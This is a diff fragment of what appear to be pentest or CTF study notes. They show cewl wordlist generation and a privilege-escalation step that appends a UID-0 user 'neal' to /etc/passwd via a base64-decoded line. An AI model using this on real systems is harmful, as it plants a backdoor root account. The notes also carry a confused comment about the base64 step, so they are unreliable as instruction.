@@ -44,10 +44,10 @@ cewl -d 2 -m 5 -w docswords.txt https://example.com
 openssl passwd -1
 
 # then make up the passwd for user neal
-neal:passwd:0:0:neal:/root/bin.bash
+neal:yourgeneratedstring:0:0:neal:/root/bin/bash
 
 # write to passwd, save the above string to a file passwd
-cat passwd | base64 -w 0
+cat passwd | base64 -w 0   # I don't know why base64, base64 comes nothing.
 
 echo generated_base64 | base64 -d >> /etc/passwd
 ```
